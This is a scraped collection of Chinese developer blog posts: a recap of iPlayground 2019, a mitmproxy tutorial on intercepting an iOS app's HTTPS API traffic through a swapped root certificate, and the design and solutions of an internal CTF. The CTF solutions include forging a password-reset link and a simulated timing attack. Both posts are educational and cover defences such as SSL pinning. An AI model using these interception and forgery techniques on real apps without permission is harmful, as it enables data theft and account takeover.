手把手教學，不過名額有限，要搶要快…顧著吃飯跟喇賽就這樣錯過了。贊助商攤位、 Ask the Speaker 區 因場地大交流更方便、更多活動；從 iChef 攤位 #iCHEFxiPlayground 獲得了一組環保吸管及銅鑼燒、 Dcard 攤位去年已拿過，今年又拿到一組貼紙+環保杯套，今年多一個厭世語錄濕紙巾、 17 直播 填問券抽 Airpods 2 、在 [ weak self ] Podcast 攤位拿了貼紙，另外還有 Grindr 、 CakeResume 、 Bitrise 的攤位可以互動，附上一張 不齊全 的戰利品照。不齊全的戰利品吃的及 After Party ，兩天都是精緻餐盒，冰咖啡、茶飲全天無限量供應；但去年比較有 After Party 的感覺，像是在酒吧聽台上的大大說故事，非常有趣；今年比較是下午茶(ㄧ樣有供應酒，燒賣跟甜點好吃！)；自行交流，但反而我今年才有認識到新朋友。吃貨必備，便當照Top 5 議程收穫1. 王巍(Wei Wang) ( 貓神) 的 網路請求元件設計這部分很有感，因為我們的專案並沒有使用第三方網路套件；而是自己封裝方法，講者說的很多設計模式、問題，也是我們需要去做的優化及重構項目，套用講者說的： 「垃圾需要分類，代碼也是…」這部分要好好回去研究了，我會做好分類的&lt;( _ _ )&gt;p.s 沒搶到 KingFisher 貼紙 QQ2. 日本的大大 kishikawa katsumi介紹 iOS ≥ 13 推出的新方法 UICollectionViewCompositionalLayout ，讓我們不用在像之前ㄧ樣去 subclass UICollectionViewLayout 或是用 CollectionView Cell 包 CollectionView 的方式完成複雜的佈局。這部分同樣有感，我們的 APP 就是使用後者的方式達成設計想要呈現的樣式，巔峰之作還有 CollectionView Cell 包 CollectionView 再包 CollectionView (三層)，程式碼很亂不易維護。除了介紹 UICollectionViewCompositionalLayout 的架構、使用方式，特別之處在於講者依照此模式自己做了一個專案，讓 iOS 12 以前的 App ㄧ樣能支援同樣的效果 — IBPCollectionViewCompositionalLayout ，太神啦！3. Ethan Huang 大大的 用 SwiftUI 開發 Apple Watch APP之前寫過一篇「 動手做一支 Apple Watch App 吧！ 」，是基於 watchOS 5 使用傳統方式；沒想到現在居然能用SwiftUI開發了！Apple Watch OS 6 是 1~5 代都支援，所以 比較沒有版本的問題 ，用手錶應用練習SwiftUI也是不錯的當出發點(相較簡化)；再找時間來翻新。p.s 只是沒想到 watchOS 的開發者也這麼邊緣QQ 我個人是覺得蠻好玩的，希望有更多人可以加入！4. TinXie-易致及羊小咩兩位大大的 APP安全議題關於 APP 本身的安全問題， 從未認真研究過，固有觀念就是「蘋果很封閉很安全！」；聽了兩位講者的演示之後覺得真是脆而不堅，也了解到 APP 安全本身的核心概念： 「當破解成本大於保護成本，APP就是安全的」沒有保證安全的 APP，只有增加破解的難易度，勸退攻擊者！還有收獲除了 Reveal 這個付費APP之外，還有開源免費的 Lookin 可以看 APP UI；Reveal 我們很常用；即使不看別人，看自己 Debug UI 問題也很方便！另外 關於連線安全的部分 ，前幾天剛好發了一篇「 APP有用HTTPS傳輸，但資料還是被偷了。 」，使用 mitmproxy 這套免費軟體做中間人攻擊抽換 root ca ；經過講者講解 中間人攻擊、原理、防護方式，一方面也驗證我寫的內容正不正確，另一方面也更了解了這個手法的道理！順便開了開眼界…知道有越獄插件可以直接攔截網路請求，連憑證抽換都不用。5. 丁沛堯大大的 優化編譯速度這也是一直以來苦惱我們的問題，編譯很慢；有時在 UI 微調時真的會抓狂，就只調個 1pt ，然後就要等，然後看到結果，然後再修正個 1pt ，然後再等，然後又調回去…while(true)….很抓狂的！講者提到的嘗試、經驗分享，很值得回去研究用在自己的專案上！ 還有很多議程（例如：色色的事A_A，之前也踩過顏色的雷） 但由於筆記較零散、個人沒有相關經驗或沒聽到該場次議程 所有內容可以等 iPlayground 2019 釋出錄影回放(有錄影的場次)、或參考官方的 HackMD 共筆筆記內容 。軟性收穫除了技術方面的收穫，我個人比去年更多的是「 軟性收穫 」，第一次跟 Ethan Huang 大大照了個面，在討論 Apple Watch 開發生態時無意間也跟貓神大大交流了幾句；另外也認識了許多新的開發者，同事 Frank 跟 George Liu 的同學 Taihsin 、 Spock 薛 、 Crystal Liu 、 Nia Fan 、 Alice 、 Ada ，老同學 Peter Chen 、老同事皓哥 邱鈺晧 …等等新朋友！yes! 更多花絮可以到 Twitter #iplayground 查看感謝 感謝所有工作人員的辛勞及講者的分享，才有這兩天收穫滿滿的活動！ 辛苦了！謝謝！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 717 Total Views Last Statistics Date: 2025-01-19 | 705 Views on Medium. " }, { "title": "APP有用HTTPS傳輸，但資料還是被偷了。", "url": "/posts/46410aaada00/", "categories": "ZRealm Dev.", "tags": "mitmproxy, man-in-the-middle, ios, ios-app-development, hacking", "date": "2019-09-20 18:01:01 +0800", "snippet": "APP有用HTTPS傳輸，但資料還是被偷了。iOS+MacOS 使用 mitmproxy 進行中間人攻擊(Man-in-the-middle attack) 嗅探API傳輸資料教學及如何防範？前言前陣子剛在公司辦完一場內部的 CTF競賽 ，在發想題目時回想起大學時候還在做後端(PHP)時經手的專案，一個集點的APP，大概就是有個任務列表，然後觸發條件完成就Call API獲得點數；老闆認為C...", "content": "APP有用HTTPS傳輸，但資料還是被偷了。iOS+MacOS 使用 mitmproxy 進行中間人攻擊(Man-in-the-middle attack) 嗅探API傳輸資料教學及如何防範？前言前陣子剛在公司辦完一場內部的 CTF競賽 ，在發想題目時回想起大學時候還在做後端(PHP)時經手的專案，一個集點的APP，大概就是有個任務列表，然後觸發條件完成就Call API獲得點數；老闆認為Call API有經過HTTPS加密傳輸資料就很安全了 — 直到我向他展示中間人攻擊，直接嗅探傳輸資料，偽造API呼叫獲得點數….再加上最近幾年大數據崛起，網路爬蟲滿天飛；爬蟲攻防戰日漸白熱化， 爬取與防爬之間花招百出 ，只能說道高一尺魔高一丈啊！爬蟲的另一條下手對象就是APP的API，如果沒有任何防範幾乎等於門戶大開；不但好操作而且格式也乾淨，更不容易被識別阻擋；所以如果網頁端已經費盡全力阻擋，資料還是不段被爬，不妨檢查一下APP的API有無漏洞。因為這個議題我不知道該如何出在 CTF比賽中 ，所以就單拉出一篇文章作為紀錄 ；本篇只是粗淺給個概念 — HTTPS能透過憑證替換進行傳輸內容解密 、如何加強安全性防止；實際網路理論不是我的強項也都還給老師了，如果已經有這方面概念的朋友就不用花時間看這篇，或拉到底看APP該如果保護！實際操作環境: MacOS + iOS Android 使用者可以直接下載 Packet Capture (免費)、iOS 用戶可使用 Surge 4 這套軟體( 付費) 解鎖中間人攻擊功能、MacOS也可以使用另一套付費軟體Charles。 本文章主要講解iOS使用 免費 的 mitmproxy 進行操作，如果您有上述的環境就不用這麼麻煩啦，直接APP打開在手機上掛載VPN替換掉憑證就能進行中間人攻擊！(ㄧ樣請直接下拉到底看該如何保護！)[2021/02/25 更新]： Mac 有新的免費圖形化介面程式 ( Proxyman ) 可以用，可搭配 參考此篇文章 的第一部分。安裝 mitmproxy直接使用 brew 安裝 ：brew install mitmproxy安裝完成!p.s 如果你出現 brew: command not found 請先安裝 brew 套件管理工具 ：/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"mitmproxy 使用安裝完成後，在 Terminal 輸入以下指令啟用：mitmproxy啟動成功讓手機跟Mac在同個區域網路內&amp;取得Mac的IP位址方法(1) Mac 連接 WiFi、手機也使用同個 WiFiMac的IP位址 = 「系統偏好設定」-&gt;「網路」-&gt;「Wi-Fi」-&gt;「IP Address」方法(2) Mac 使用有線網路，開啟網路分享；手機連上該熱點網路:「系統偏好設定」-&gt; 「共享」-&gt;選擇「乙太網路」-&gt;「Wi-Fi」打勾-&gt; 「Internet 共享」啟用Mac的IP位址 = 192.168.2.1 （️️注意⚠️ 不是乙太網路網路的IP，是Mac用做網路分享基地台的IP)手機網路設置WiFi — Proxy伺服器資訊「設定」-&gt; 「WiFi」-&gt; 「HTTP 代理伺服器」-&gt; 「手動」-&gt; 「伺服器輸入 Mac的IP位址 」-&gt; 「連接埠輸入 8080 」-&gt; 「儲存」 這時網頁打不開、出現憑證錯誤是正常的；我們繼續往下做…安裝 mitmproxy 自訂 https 憑證如同上述所說，中間人攻擊的實現方式就是在通訊之中使用自己的憑證做抽換加解密資料；所以我們也要在手機上安裝這個自訂的憑證。1.用手機safari打開 http://mitm.it出現左邊-&gt;Proxy設定✅/ 出現右邊代表 Proxy設定有誤🚫「Apple」-&gt;「安裝描述檔」-&gt;「安裝」 ⚠️到這裡還沒結束，我們還要去關於裡啟用描述檔「一般」-&gt;「關於」-&gt;「憑證信任設定」-&gt;「mitmproxy」啟用完成！這時我們再回去瀏覽器就能正常瀏覽網頁了。回到Mac 上操作 mitmproxy可以在mitmproxy Terminal上看到剛手機的資料傳輸紀錄找到想嗅探的紀錄進入查看Request(送出哪些參數)/Response(回傳了什麼內容)常用操作按鍵集：「 ? 」= 查看按鍵操作集文檔「 k 」/「⬆」= 上 「 j 」/「⬇」= 下 「 h 」/「⬅」= 左 「 l 」/「➡️」️= 右 「 space 」= 下一頁「 enter 」= 進入查看詳情「 q 」= 返回上一頁/退出「 b 」= 匯出response body到指定path文字檔 「 f 」= 篩選紀錄條件「 z 」= 清除所有紀錄「 e 」= 編輯Request(cookie、headers、params...)「 r 」= 重新發送Request不習慣CLI? 沒關係，可以改用 Web GUI !除了 mitmproxy 啟用方式之外，我們可以改下：mitmweb就能使用新的 Web GUI 進行操作觀察mitmweb重頭戲，嗅探APP資料：上述環境都建置完成也熟悉之後，就可以進入我們的重頭戲；嗅探APP API的資料傳輸內容！ 這邊以某房屋APP作為範例，無惡意純學術交流使用! 我們想知道物件列表的API是如何請求和回傳什麼內容!首先先按「z」清除所有紀錄(避免搞亂)開啟目標 APP開啟目標 APP 嘗試「下拉重整」或觸發「載入下一頁」的動作。 🛑若你的目標APP打不開、連不上；那抱歉了，代表APP有做防範無法用這招嗅探，請直接下拉到如何保護的章節🛑mitmproxy 紀錄回到 mitmproxy 查看紀錄，發揮偵探的精神猜測哪個API請求紀錄是我們想要的並進入查看詳細！RequestRequest 部分可以看到 請求傳遞了哪些參數搭配「e」編輯與「r」重新發送，並觀察 Response 就可以猜到每個參數的用途囉！ResponseResponse 也能直接獲得原始回傳內容。 🛑若Response內容是一堆編碼；那也抱歉了，代表APP可能有自己再做一次加解密無法用這招嗅探，請直接下拉到如何保護的章節🛑很難閱讀？中文亂碼？沒關係，這邊可以用「b」匯出成文字檔到桌面，再將內容複製到 Json Editor Online 解析即可! *或是直接使用 mitmweb 使用 web gui 直接瀏覽、操作mitmweb經過嗅探、觀察、過濾、測試之後就能知道APP API的運作方式，藉此就能利用，用爬蟲爬取資料。 *蒐集完所需資訊記得關閉mitmproxy、手機網路Proxy代理伺服器改回自動，才能正常使用網路。APP 該如何自保？若掛上 mitmproxy 之後發現APP不能用、回傳內容是編碼，代表APP有做保護。做法(1):大略是將憑證資訊放一份到APP中，若當前HTTPS使用的憑證與APP中的資訊不符則拒絕訪問，詳細可以 看此 或找 SSL Pinning 相關資源。缺點可能就是要注意憑證有效期的問題吧！https://medium.com/@dzungnguyen.hcm/ios-ssl-pinning-bffd2ee9efc作法(2):APP端在資料要傳輸前先進行編碼加密，API後端收到後解密取得原始請求內容；API回傳內容一樣先進行編碼加密，APP端收到資料後解密取得回傳內容；步驟很煩瑣也耗效能，但的確是個方法；據我所知好像某數字銀行就是用這招進行保護!不過….作法1，依然有破解方法： 如何在iOS 12上绕过SSL Pinning作法2，透過反編譯工程也能獲得編碼加密用的密鑰⚠️沒有100%的安全⚠️或是乾脆挖個洞讓它爬，邊搜集各種證據，再用法務解決（？還是那句話： 「 NEVER TRUST THE CLIENT」mitmproxy 的更多玩法：1.使用mitmdump除 mitmproxy 、 mitmweb ， mitmdump 可直接將所有紀錄匯出到文字檔中mitmdump -w /log.txt並且能使用 玩法(2) python程式，設定、篩選流量:mitmdump -ns examples/filter.py -r /log.txt -w /result.txt2.搭配python程式做請求參數設定、訪問控制、轉址：from mitmproxy import httpdef request(flow: http.HTTPFlow) -&gt; None: # pretty_host takes the \"Host\" header of the request into account, # which is useful in transparent mode where we usually only have the IP # otherwise. # 請求參數設定 Example: flow.request.headers['User-Agent'] = 'MitmProxy' if flow.request.pretty_host == \"123.com.tw\": flow.request.host = \"456.com.tw\" # 將123.com.tw的訪問全導到456.com.tw轉址範例啟用mitmproxy時加上參數：mitmproxy -s /redirect.pyormitmweb -s /redirect.pyormitmdump -s /redirect.py補個坑在使用 mitmproxy 觀察使用 HTTP 1.1 及 Accept-Ranges: bytes、 Content-Range 長連接片段持續拿取資源的請求時，會等到 response 全部回來才會顯示，而不是顯示分段、使用持久連接接續下載！踩坑在這 。延伸閱讀 以簽到獎勵 APP 為例，打造每日自動簽到腳本 如何打造一場有趣的工程CTF競賽 揭露一個幾年前發現的巧妙網站漏洞 iOS 15 / MacOS Monterey Safari 將能隱藏真實 IP後記因為我沒有網域權限無法取得ssl憑證資訊，所以也無法實作；看程式碼感覺並不困難，雖然沒有100%安全的方法，但多一道防護至少能更安全一些，再繼續攻需要花費很多時間研究，應該能勸退90%的爬蟲了！這篇文章可能有點含金量太低，medium荒廢了一陣子(跑去玩單眼)，主要為本週六日(2019/09/21–2019/09/22)的 iPlayground 2019 提前熱熱寫文手感；期待今年的議程🤩，希望回來後能吸收產出更多精品文章！ [2019/02/22 更新文章] iPlayground 2019 是怎麼樣的體驗？有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 10,075 Total Views Last Statistics Date: 2025-01-19 | 10,020 Views on Medium. " }, { "title": "如何打造一場有趣的工程CTF競賽", "url": "/posts/729d7b6817a4/", "categories": "ZRealm Dev.", "tags": "capture-the-flag, ios-app-development, php, computer-science, wargame", "date": "2019-07-24 22:32:34 +0800", "snippet": "如何打造一場有趣的工程CTF競賽Capture The Flag 競賽建置與題目發想關於 CTFCapture The Flag 奪旗簡稱 CTF；是一種源於西方的運動，在現代也常見於漆彈、第一人稱射擊遊戲中；原始概念是分組進行，各組需要保護自己的旗幟不被搶走另一方面也要想辦法得到別組的旗幟；應用在計算機領域就是「入侵攻防戰」首先找到自己的漏洞保護好不被入侵，另一方面製造零時差攻擊從其他隊伍...", "content": "如何打造一場有趣的工程CTF競賽Capture The Flag 競賽建置與題目發想關於 CTFCapture The Flag 奪旗簡稱 CTF；是一種源於西方的運動，在現代也常見於漆彈、第一人稱射擊遊戲中；原始概念是分組進行，各組需要保護自己的旗幟不被搶走另一方面也要想辦法得到別組的旗幟；應用在計算機領域就是「入侵攻防戰」首先找到自己的漏洞保護好不被入侵，另一方面製造零時差攻擊從其他隊伍搶奪分數。以上屬於標準甚至可以說是「進階」的 CTF 比賽方式，要在企業內部Run一場 CTF 比賽還會有其他現實考量： 舉辦 CTF 比賽的目的除了提升技術能力外還有 促進工程師之間的交流 工程師各有所長，有Front-End、Back-End、APP、DevOps；若希望大家都能參與，出題方向就不能太針對某個領域（如:網路、PHP） 分組要能強弱、更領域專長平均分散 活動時間頂多一個下午 舉辦 CTF 比賽屬於主要工作業務之外的Side Project，沒有太多的資源跟時間綜合以上因素，與其說是一場 CTF比賽，不如說是場： 分組解謎累積旗幟積分＆促進工程師之間交流的活動屬於初階的 CTF比賽！活動目標 提升工程技術能力 促進工程師之間交流 激發大家探索事物的熱忱、敏銳度 有趣，無趣的事做起來很痛苦3、4項是我自己加入的，我對這個活動的期望不只是實務面；更希望透過有趣的方式提升大家對探索、學習新事物的熱忱，就如同日常工作一般；不應該只做碼農，而是要想辦法自我突破繼續向前！比賽規則 將工程師依照專長、強弱平均分組 比賽時間：90分鐘 題目一共出了12題，提供3次花費得分購買提示的機會 提示購買花費依照時間遞減（越早買越貴） 每題有基本得分+時間得分（越早解越多） 選擇開啟某個題目答題後，將鎖定只能回答該提或其他已開啟的題目；直到該提通過或鎖定時間結束（會有這條規則是因為活動主要希望組員之間能交流一起腦力激盪，而不是分工解題） 每題分數、提示花費、鎖定時間依照題目難易度各有所不同 勝利條件：累積得分最高獲勝，若分數一樣則比較解題時間 獲勝隊伍有$$如何打造？活動規則跟目標都釐清之後，再來的重頭戲就是如何打到一場 CTF比賽？此部分要分兩個章節說明， 第一是打造能進行 CTF比賽的系統 ， 第二是 比賽題目的發想1.打造能進行 CTF比賽的系統 這部分需要具備前端跟後端相關技術才能實作，如果不熟悉就只能請其他同事幫忙囉。前端： Semantic UI後端：PHP+json檔儲存資料因為時間有限，所以比賽系統的部分以簡單穩定快速搭建為主；這邊前端介面直接套用 Semantic UI 這套Framework；後端使用老本行PHP撰寫，無使用Framework，資料儲存部分也直接使用json檔做存放，無使用資料庫；一切從簡，也比較不會有問題（例如有人想攻擊比賽系統直接獲得答案）。入口頁：以有趣為出發點，入口頁使用BBC影集Sherlock的梗：手機解鎖密碼 S H E R這四格輸入框用來輸入各組得到的識別碼(4位數)，例如：輸入第一組：「1432」、第二組：「8421」，用來識別要答題的組別。至於各組的識別碼這邊我多埋了一個梗，識別碼呈現如下：有看出來四位數字識別碼了嗎？沒有的話請離螢幕遠一點看看。…….…………………………………………………………………………………….………………………………….……………………………. .……………………….………………. .……………….. .解答：第一組的識別碼是 8291輸入之後就會進入比賽系統主頁-題目列表：上方顯示： Team 1 組別、提示券剩餘張數中間題目區： 題目名稱、描述、通過獲得分數、鎖定時間、購買提示、提示顯示滑鼠移入會顯示時間分數、提示價格下方顯示： Total 目前總分後端及其他邏輯： 題目列表頁每秒會用Ajax跟後端要當前答題狀況，後端讀取、記錄答題狀況在各組的json檔；按解鎖答題時會記錄時間、時間未到無法解鎖其他題目、答題通過寫入完成時間、時間分數、提示價格會依照花費時間遞增遞減。 比賽系統大致上如此，不過重點不在於比賽系統，而是題目本身！ 有不有趣、能不能讓所有人參與、有沒有邏輯、新不新奇…真的很難發想讓我們趕進進入重點吧！2.比賽題目的發想首先介紹我所發想的5個題目1.通往魔法學院的大門題目說明： 你會得到一串金鑰，要想辦法使用這把鑰匙解出咒語，輸入在咒語輸入框；下方有驗證碼欄位需要輸入，按驗證進行答題。解答：本題考的是資安及編碼問題；平台加解密漏洞接口運用，若在網站設計時所有的加密解密都使用同一套方式、同一把鑰匙，我們就能運用這個弱點去解開加密內容得到原始資料！可以看到驗證碼的部分是 ./image.php?token=AD0HbwdgVDw= 這裡就提供一個解密的接口，所以我們可以試試把上方的加密金鑰帶入：即可得到解密後的字串：LiveALifeYouWillRemeber輸入到咒語輸入框後即可通關！2.請帶我回到1937年的上海！題目說明： 要想辦法輸入年/月/日送出到後端，讓後端判別成是1937年；年份輸入範圍(1947~2099)無法直接輸入1937年。解答：本題旨不在如何繞過前端判斷，因為後端有處理所以無法繞過；本題主要考的是 32位元電腦2038年問題 ，因為位元數限制32位元的timestamp最多只能顯示到2038年1月19日03:14:07，超過將會溢位回到1901年1月1日；因此可以透過往後推算輸入 2073–02–06 到 2074–02–05 都會落在1937年，輸入這範圍的日期後即可傳送成功！維基百科3.神鬼交鋒題目說明： 要想辦法收取一個第三方(你無法登入的信箱)的密碼重設信，完成重設別人的密碼。解答：本題需要更多的敏銳度，首先先使用自己可以收信的信箱做密碼重設；我們收到的信件如下：您的密碼重設連結：http://ctf.zhgchg.li/10/reset.php?requestid=OTk= 如跟您無關聯，無須理會此封信，謝謝！我們可以發現密碼重設請求是透過requestid這個參數去識別，我們得到的值是 OTk= ，看起來是base64?，試試看吧：base64 decode and encode我們可以得到參數的值是99，再重複請求一次密碼重設得到100，因此可以推測密碼重設請求是流水號，下一號就是101，這時再回到原本要繞過的信箱按重設密碼請求，我們就能自行偽造組合出密碼重設連結，進而偷偷重設別人的密碼。將101 Encode Base64 =&gt; MTAx，偽造網址： http://ctf.zhgchg.li/10/reset.php?requestid=MTAx ，隨意輸入密碼後按下密碼重設即可通關！4.馬甲大師題目說明： 你需要生出10組Gmail信箱（Gmail託管信箱），收取解答信。解答：本題當然可以暴力破解，但公司信箱是不能隨意註冊的；除非找到10個人幫你收信不然無法解答。本題關鍵是 Gmail信箱/Gmail託管信箱，由於公司信箱是Gmail託管信箱；所以也有Gmail信箱的特性：可以使用「.」、「+」創造出無限的分身信箱，「.」可以放在帳號任意位置、「+」可以放在最後+任何數字例如：主信箱是 zhgchgli@gmail.com ，但z.hgchgli@gmail.com、zh.gchgli@gmail、zhgchgli+1@gmail.com、zhgchgli+25@gmail.com…都會寄到 zhgchgli@gmail.com 主信箱，一個信箱就能創造出多個身份！這體主要在提醒大家在做帳號註冊時要多過濾掉這些字符，以免讓有心人利用註冊大量假帳號。收取完10封信就能組合出解答所在網址，進入網址後即可通關！5.時間機器題目說明： 跟第3題神鬼交鋒有點像，要想辦法收取一個第三方(你無法收取簡信)的手機簡訊驗證碼(4位數字)，完成登入別人的帳號。解答：本題較冷門困難，主要模擬旁路時序攻擊，系統登入驗證包含複雜演算法，在處理驗證資訊時會有時差出現（例如：輸入對1碼處理比較久. .全錯馬上就返回了，很快）；透過觀察這些時差我們從 0000 開始一位一位去嘗試，嘗試 2000 時發現處理了一秒，我們可以得知第一位是 2 ；再繼續嘗試 2100 還是一秒， 2200 時又更慢了，變兩秒…再繼續試第三位、第四位最後就能直接獲得解答「 2256 」本題只是模擬此種攻擊，後端處理直接用sleep模擬非實際有複雜的演算法，一般在網頁、APP開放上也較少遇到這種攻擊；一放面是處理資訊都不夠複雜到會有明顯時差、另一方面還有網路因素影響，不好判斷。關於旁路攻擊詳細可參考此篇文章：30 分钟理解 CORB 是什么 — 旁路攻击（side-channel attacks） 以上是我發想的5題，下面繼續介紹同事們提供的剩下7題題目。1.貞子出鏡貞子圖取自網路題目說明： 題目就是一張貞子圖，要在上方對話輸入框輸入貞子想說的話，即可通關。解答：本題考大家知不知道圖片能塞其他資訊的概念，關鍵在這張圖的原圖：貞子圖取自網路這張圖已經偷偷壓縮一個文字檔在裡面（實際作法請參考： How To Hide A ZIP File Inside An Image On Mac [Quicktip] ，這邊要注意Win/Mac的問題）所以我們只要簡單的在Commone unzip 這張圖就能獲得通關字串：在輸入框輸入「YOUHAVENOIDEA」即可通關！補充：關於圖片隱藏資訊部分，這邊還有另一種方式，使用「 圖像隱碼術(Steganography) 」圖像隱碼術(Steganography)與惡意程式：原理和方法簡單來說就將像素色碼的顏色值做手腳藏資訊，實際圖片已變但肉眼無法分辨出來。這題怕大家走這個方向，所以也在圖片裡做了隱碼，走這條路的人可以獲得提示：Steganography Online將圖片上傳至線上隱碼解碼工具即可獲得提示。2.凱薩大帝的摩斯密碼素材圖片取自網路題目說明： 試解出題目所提供的摩斯密碼所含的意思（一句英文）。解答：本題相當直白，第一步就是先解出摩斯密碼代表的英文字母「 VYYXI DN HT GDAZ 」摩斯密碼翻譯器然後再做凱薩密碼解密，當我們嘗試到偏移量5時可以得到一句有意義的英文句子「 addcn is my life」，即為答案！凱薩密碼解密工具3.你覺得是什麼？打開這題的網頁就是一堆亂碼，完整如下：ZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFtSUFBQUIrQ0FZQUFBQ0gzWDB2QUFBS3cybERRMUJKUTBNZ1VISnZabWxzWlFBQVNJbVZsd2RVazFrV3g5LzNwVGRhQWdKU1F1OUlyMUpDYUFHVVhtMkVKSkJRWWt3SUFuWmtjQVRHZ29vSWxnRWRCRkZ3TElDTUJiRmdZVkN3Z0hXQ0RBcktPRmdRRlpYOWdDWE03SjdkUFh0ejN2Zjl6ai8zM1hmdk8rL2wzQUJBSWJORm9uUllDWUFNWWFZNElzQ0hIaGVmUU1mMUF3akFnQUJvd0pMTmtZZ1lZV0VoQUxHWjk5L3R3MzNFRzdFN1ZwT3gvdjM3LzJyS1hKNkVBd0FVaG5BU1Y4TEpRUGdVTXQ1eVJPSk1BRkExaUc2d01sTTB5UjBJMDhSSWdnakxKamxsbXQ5UGN0SVVvL0ZUUGxFUlRJUzFBTUNUMld4eENnQmtVMFNuWjNGU2tEamtRSVJ0aEZ5QkVPRnNoRDA1ZkRZWDRXYUVMVE15bGsveTd3aWJKdjBsVHNyZllpYkpZN0xaS1hLZXJtWEs4TDRDaVNpZG5mTi9ic2YvdG94MDZjd2F4c2dnODhXQkVjaGJFOW16M3JUbHdYSVdKaTBNbldFQmQ4cC9pdm5Td09nWjVraVlDVFBNWmZzR3krZW1Md3laNFdTQlAwc2VKNU1WTmNNOGlWL2tESXVYUjhqWFNoWXpHVFBNRnMrdUswMkxsdXQ4SGtzZVA1Y2ZGVHZEV1lLWWhUTXNTWXNNbnZWaHluV3hORUtlUDA4WTRETzdycis4OWd6Slgrb1ZzT1J6TS9sUmdmTGEyYlA1ODRTTTJaaVNPSGx1WEo2djM2eFB0TnhmbE9ralgwdVVIaWIzNTZVSHlIVkpWcVI4YmlaeUlHZm5oc24zTUpVZEZEYkRJQVl3Z0IzeXNVY0dIVVFDSGhBREFmSkVhc25rWldkT0ZzUmNMc29SQzFMNG1YUUdjdE40ZEphUVkyMUp0N094ZFFWZzh0NU9INHQzdlZQM0VWTER6Mm81VzVCanJvQ0l3N05hckNFQXh3WUIwSGc5cXhrakdvMElRRk1FUnlyT210YlFrdzhNSUFKRjVQZEFBK2dBQTJBS3JKQXNuWUE3OEFaK0lBaUVnaWdRRDVZQ0R1Q0REQ1R2bFdBMTJBQUtRQkhZQm5hQmNuQUFIQVExNEJnNEFackFXWEFSWEFVM3dXMXdEendDTWpBQVhvRVI4QUdNUXhDRWd5Z1FGZEtBZENFanlBS3lnMXdnVDhnUENvRWlvSGdvRVVxQmhKQVVXZzF0aElxZ0VxZ2Nxb1Jxb1oraE05QkY2RHJVQlQyQStxQWg2QzMwR1ViQlpKZ0dhOFBHOER6WUJXYkF3WEFVdkFST2dWZkF1WEErdkFVdWc2dmdvM0FqZkJHK0NkK0RaZkFyZUJRRlVDU1VHa29QWllWeVFURlJvYWdFVkRKS2pGcUxLa1NWb3FwUTlhZ1dWRHZxRGtxR0drWjlRbVBSVkRRZGJZVjJSd2VpbzlFYzlBcjBXblF4dWh4ZGcyNUVYMGJmUWZlaFI5RGZNQlNNRnNZQzQ0WmhZZUl3S1ppVm1BSk1LYVlhY3hwekJYTVBNNEQ1Z01WaTFiQW1XR2RzSURZZW00cGRoUzNHN3NNMllGdXhYZGgrN0NnT2g5UEFXZUE4Y0tFNE5pNFRWNERiZ3p1S3U0RHJ4ZzNnUHVKSmVGMjhIZDRmbjRBWDR2UHdwZmdqK1BQNGJ2d0wvRGhCaVdCRWNDT0VFcmlFSE1KV3dpRkNDK0VXWVlBd1RsUW1taEE5aUZIRVZPSUdZaG14bm5pRitKajRqa1FpNlpOY1NlRWtBV2s5cVl4MG5IU04xRWY2UkZZaG01T1o1TVZrS1hrTCtUQzVsZnlBL0k1Q29SaFR2Q2tKbEV6S0Zrb3Q1UkxsS2VXakFsWEJXb0dsd0ZWWXAxQ2gwS2pRcmZCYWthQm9wTWhRWEtxWXExaXFlRkx4bHVLd0VrSEpXSW1weEZaYXExU2hkRWFwUjJsVW1hcHNxeHlxbktGY3JIeEUrYnJ5b0FwT3hWakZUNFdya3E5eVVPV1NTajhWUlRXZ01xa2M2a2JxSWVvVjZnQU5Tek9oc1dpcHRDTGFNVm9uYlVSVlJkVkJOVVkxVzdWQzlaeXFUQTJsWnF6R1VrdFgyNnAyUXUyKzJ1YzUybk1ZYzNoek5zK3BuOU05WjB4OXJycTNPays5VUwxQi9aNzZadzI2aHA5R21zWjJqU2FOSjVwb1RYUE5jTTJWbXZzMXIyZ096NlhOZFovTG1WczQ5OFRjaDFxd2xybFdoTllxcllOYUhWcWoyanJhQWRvaTdUM2FsN1NIZGRSMHZIVlNkWGJxbk5jWjBxWHFldW9LZEhmcVh0QjlTVmVsTStqcDlETDZaZnFJbnBaZW9KNVVyMUt2VTI5YzMwUS9XajlQdjBIL2lRSFJ3TVVnMldDblFadkJpS0d1NFFMRDFZWjFoZytOQ0VZdVJueWozVWJ0Um1QR0pzYXh4cHVNbTR3SFRkUk5XQ2E1Sm5VbWowMHBwbDZtSzB5clRPK2FZYzFjek5MTTlwbmROb2ZOSGMzNTVoWG10eXhnQ3ljTGdjVStpeTVMaktXcnBkQ3l5ckxIaW16RnNNcXlxclBxczFhekRySE9zMjZ5ZmozUGNGN0N2TzN6MnVkOXMzRzBTYmM1WlBQSVZzVTJ5RGJQdHNYMnJaMjVIY2V1d3U2dVBjWGUzMzZkZmJQOUd3Y0xCNTdEZm9kZVI2cmpBc2ROam0yT1g1MmNuY1JPOVU1RHpvYk9pYzU3blh0Y2FDNWhMc1V1MTF3eHJqNnU2MXpQdW41eWMzTExkRHZoOXFlN2xYdWEreEgzd2ZrbTgzbnpEODN2OTlEM1lIdFVlc2c4Nlo2Sm5qOTZ5cnowdk5oZVZWN1B2QTI4dWQ3VjNpOFlab3hVeGxIR2F4OGJIN0hQYVo4eHBodHpEYlBWRitVYjRGdm8yK21uNGhmdFYrNzMxRi9mUDhXL3puOGt3REZnVlVCcklDWXdPSEI3WUE5TG04VmgxYkpHZ3B5RDFnUmREaVlIUndhWEJ6OExNUThSaDdRc2dCY0VMZGl4NFBGQ280WENoVTJoSUpRVnVpUDBTWmhKMklxd1g4S3g0V0hoRmVIUEkyd2pWa2UwUjFJamwwVWVpZndRNVJPMU5lcFJ0R20wTkxvdFJqRm1jVXh0ekZpc2IyeEpyQ3h1WHR5YXVKdnhtdkdDK09ZRVhFSk1RblhDNkNLL1Jic1dEU3gyWEZ5dytQNFNreVhaUzY0djFWeWF2dlRjTXNWbDdHVW5FekdKc1lsSEVyK3dROWxWN05Fa1Z0TGVwQkVPazdPYjg0cnJ6ZDNKSGVKNThFcDRMNUk5a2t1U0IxTThVbmFrRFBHOStLWDhZUUZ